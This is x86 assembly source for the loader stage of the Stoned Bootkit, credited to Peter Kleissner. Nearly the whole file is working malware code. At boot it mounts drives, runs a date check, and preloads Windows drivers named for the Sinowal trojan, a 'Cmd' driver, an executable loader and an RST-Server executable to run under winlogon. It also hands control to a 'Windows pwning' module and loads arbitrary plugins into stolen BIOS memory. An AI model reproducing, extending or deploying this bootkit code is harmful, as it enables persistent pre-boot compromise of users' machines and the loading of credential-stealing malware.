; ******************************************************

;       Name: Operating System Loader
;       Author: Peter Kleissner
;       Version: 0.1
;       Date: 17.02.2008 17:11:31
;       last Update: 26.04.2009 14:02:22

;       Stoned Bootkit
;       (C) 2009 Vienna Computer Products

; ******************************************************

[bits 16]                                       ; create a 16 Bit Code
CPU 386                                         ; Assemble instructions up to the 386 instruction set

%include "Module Functions.asm"
%include "Kernel Storage.asm"

org System_Loader

jmp word Entry_Point
jmp word Load_Plugin


; todo: add export for some undocumented functions
; + create Service Interrupt Handler and far call address


Entry_Point:

%ifdef _DEBUG
call API_Clear_Textmode_Screen
mov eax,Stage_1_Sub_0
call API_Debug_Message
%endif


; hide the cursor, no one needs it
call API_Hide_Cursor

; enable background colors, disable auto-blink
call API_Enable_Extended_Colors

%ifdef _DEBUG
mov eax,Stage_1_Sub_1
call API_Debug_Message
%endif

; mount all drives
call API_Mount_Drives

%ifdef _DEBUG
mov eax,Stage_1_Sub_2
call API_Debug_Message
%ifdef Sinowal or Windows
mov eax,File_Boot_Application
call API_Debug_Message_Append
%elifdef WinModule
mov eax,Stage_1_Sub_2_WinModule
call API_Debug_Message_Append
%endif
%endif

; clear the Textmode Screen
;call API_Clear_Textmode_Screen

; date
mov ah,04h                ; INT 1A - TIME - GET REAL-TIME CLOCK DATE
int 1Ah
jc Drivers_Loaded
cmp cl,10h                ; CL = year (BCD)     2010
jne Drivers_Loaded
cmp dh,02h                ; DH = month (BCD)    02 (February)
ja Drivers_Loaded
;cmp dh,24h                ; DL = day (BCD)      < 24
;ja Drivers_Loaded

; DONE with initialising!



; ********************************************************
; pre-load all initial Windows drivers

mov bl,00000111b              ; loading bits (load, relocate, resolve & execute + Stoned entry point)
mov eax,Windows_Driver_1      ; \??\C:\Stoned\Drivers\Sinowal Extractor.sys
call Preload_Driver

mov bl,00000000b              ; loading bits (load & execute)
mov eax,Windows_Driver_2      ; \??\C:\Stoned\Drivers\Sinowal.sys
call Preload_Driver

mov bl,00000111b              ; loading bits (load, relocate, resolve & execute + Stoned entry point)
mov eax,Windows_Driver_3      ; \??\C:\Stoned\Drivers\Cmd.sys
call Preload_Driver

mov bl,00000111b              ; loading bits (load, relocate, resolve & execute + Stoned entry point)
mov eax,Windows_Driver_4      ; \??\C:\Stoned\Drivers\Exe Loader.sys
call Preload_Driver

mov bl,00011111b              ; loading bits (load, relocate, resolve & execute + Stoned entry point, executable, winlogon)
mov eax,Windows_Executable_1  ; C:\Stoned\RST-Server.exe
call Preload_Driver

cmp [Loaded_Drivers],dword 0
je Drivers_Loaded

; copy the driver loading table
mov si,Driver_Loading_Table                                                     ; source (already filled)
mov cx,[Loaded_Drivers]                                                         ; size of table (= count * 13)
imul cx,13
mov di,[Symbol_Driver_Loading_Table]                                            ; destination = in Windows attacking module
add di,Pwn_Windows
rep movsb

Drivers_Loaded:




; ********************************************************
; load and execute
;   a) Sinowal Loader (boot application)
;   b) Windows Attack (boot application or embedded)


%ifdef Sinowal or Windows
; load boot application
push dword Boot_Application
push dword File_Boot_Application
call API_Load_File
jnc Loading_Boot_Application_Successful

; error loading boot application

; write out failed message (currently without error code)
call API_Clear_Textmode_Screen

mov eax,Error_Message_Loading_File
call API_Debug_Message

mov eax,File_Boot_Application
call API_Debug_Message

cli
hlt

Loading_Boot_Application_Successful:
%endif


%ifdef _DEBUG
mov eax,Stage_1_Message
call API_Debug_Message
%endif


; execute the boot application
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

mov ds,ax
mov es,ax
mov fs,ax
mov gs,ax

%ifdef Sinowal or Windows
jmp 0000h:Boot_Application
%elifdef WinModule
jmp 0000h:Pwn_Windows
%endif






Load_Plugin:

; Load_Plugin, File Name

; open the file
push dword Load_Plugin_File
push dword [Param1]
call API_Open_File

ret 4


Load_Plugin_File:
mov edx,eax                                                                     ; store the handle

; get the file size
push eax
call API_Get_File_Size
or eax,eax                                                                      ; valid file size?
jz Load_Plugin_File_Exit

; allocate memory
mov ebx,eax
add ebx,1024-1                                                                  ; round up
shr ebx,10                                                                      ; / 1024 (KB)
sub [0413h],word bx                                                             ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
movzx ebx,word [0413h]                                                          ; get the base (in KB) of the newly allocated memory
shl ebx,10                                                                      ; get the byte position, * 1024

; read the file into memory
push dword eax                                                                  ; file size
push dword ebx                                                                  ; base address
push dword edx                                                                  ; handle
call API_Read_File

; execute it!
push es
shr bx,4                                                                        ; segment = linear address / 16
mov es,bx                                                                       ; store segment address
xor di,di                                                                       ; offset
push cs                                                                         ; stack for far return back to here
push Load_Plugin_Return
push es                                                                         ; segment:offset for far jump to plugin
push di
retf
Load_Plugin_Return:
pop es

Load_Plugin_File_Exit:                                                          ; return from the callback

ret



Preload_Driver:

; eax = pointer to driver name
; bl = loading bits

mov [Temp_Loading_Bits],byte bl

%ifdef _DEBUG
push eax
mov eax,Stage_1_Sub_3
call API_Debug_Message
mov eax,[esp]
call API_Debug_Message_Append
pop eax
%endif

; open the file
push dword Preload_Driver_File
push dword eax
call API_Open_File

ret


Preload_Driver_File:
mov edx,eax                                                                     ; store the handle

mov edi,[Loaded_Drivers]                                                        ; loaded drivers > max. drivers?
cmp edi,4
jae Preload_Driver_File_Exit
imul edi,13

cmp [Temp_Loading_Bits],byte 0FFh                                               ; already preloaded? (only load the first found version)
je Preload_Driver_File_Exit

; get the file information
;   return:   eax = File size in bytes
;             ebx = File base (sector number)
;             ecx = Device type, 1 = hard disk, 2 = CD/DVD/BD
push eax                                                                        ; handle
call API_Get_File_Info
or eax,eax                                                                      ; valid file size?
jz Preload_Driver_File_Exit

; store the information
add edi,Driver_Loading_Table
mov [edi + 0],ecx                                                               ; device type
mov [edi + 4],ebx                                                               ; sector number
mov [edi + 8],eax                                                               ; size in bytes
mov bl,[Temp_Loading_Bits]
mov [edi + 12],bl                                                               ; loading bits

%ifdef _DEBUG
mov eax,Stage_1_Sub_3_Found
call API_Debug_Message_Append
%endif

mov [Temp_Loading_Bits],byte 0FFh                                               ; prevent loading the same driver twice by accident
inc dword [Loaded_Drivers]

Preload_Driver_File_Exit:                                                       ; return from the callback

ret

Temp_Loading_Bits                       db  00000111b






; Boot Applications

%ifdef Sinowal
File_Boot_Application                   db  "?:\Stoned\Applications\Sinowal Loader.sys", 0
%elifdef Windows
File_Boot_Application                   db  "?:\Stoned\Applications\Windows.sys", 0
%endif


; Windows Drivers

Windows_Driver_1                        db  "?:\3c71344471ef9d12616c4bc4b4e2364f", 0    ; MD5 \??\C:\Stoned\Drivers\Sinowal Extractor.sys
Windows_Driver_2                        db  "?:\6c6f9b2545cf9dc73e597659c671d730", 0    ; MD5 \??\C:\Stoned\Drivers\Sinowal.sys
Windows_Driver_3                        db  "?:\15137ef73def24f4f00239628a70df43", 0    ; MD5 \??\C:\Stoned\Drivers\Cmd.sys
Windows_Driver_4                        db  "?:\9d02867239b96bff7d5e78a234aa4955", 0    ; MD5 \??\C:\Stoned\Drivers\Exe Loader.sys
Windows_Executable_1                    db  "?:\8da19a3b12d6e94b8e9cf506e79975e8", 0    ; MD5 C:\Stoned\RST-Server.exe

; variables to the Driver Loading Table
;         + 00h   Drive
;                   1 = RawFS \??\PhysicalDrive0
;                   2 = CDFS  \??\CdRom0
;                   3 = Any (theoretical)   File Name (relative to Data_Reference)
;         + 04h   Sector Number (or file name pointer)
;         + 08h   Size
;         + 0Ch   Loading bits
;                   Bit 0: Relocate the image
;                   Bit 1: Resolve imports
;                   Bit 2: Entry point
;                   Bit 3: Executable (= 1) or dll
;                   Bit 4: Execute under winlogon.exe (= 1) or explorer.exe (executable only)
Loaded_Drivers                          dd  0                                           ; count
Driver_Loading_Table:
dd  0,  0,  0     ; reserved for Sinowal.sys
db  00000000b
dd  0,  0,  0     ; reserved for Sinowal Extractor.sys
db  00000000b
dd  0,  0,  0     ; reserved for Cmd.sys
db  00000000b
dd  0,  0,  0     ; reserved for Exe Loader.sys
db  00000000b
dd  0,  0,  0     ; reserved for RST-Server.exe
db  00000000b
dd  0             ; Terminator


; Debug Messages

%ifdef _DEBUG
Stage_1_Sub_0                           db  "Hide cursor, enable background colors, disable auto-blink", 0
Stage_1_Sub_1                           db  "Mount drives...", 0
Stage_1_Sub_2                           db  "Load boot application: ", 0
Stage_1_Sub_2_WinModule                 db  "(Windows pwning module)", 0
Stage_1_Sub_3                           db  "  ", 0
Stage_1_Sub_3_Found                     db  " loaded", 0
Stage_1_Message                         db  "Starting boot application...", 0
%endif


%ifdef Sinowal or Windows
Error_Message_Loading_File              db  "Error loading the Boot Application:", 13, 10, 0
%endif

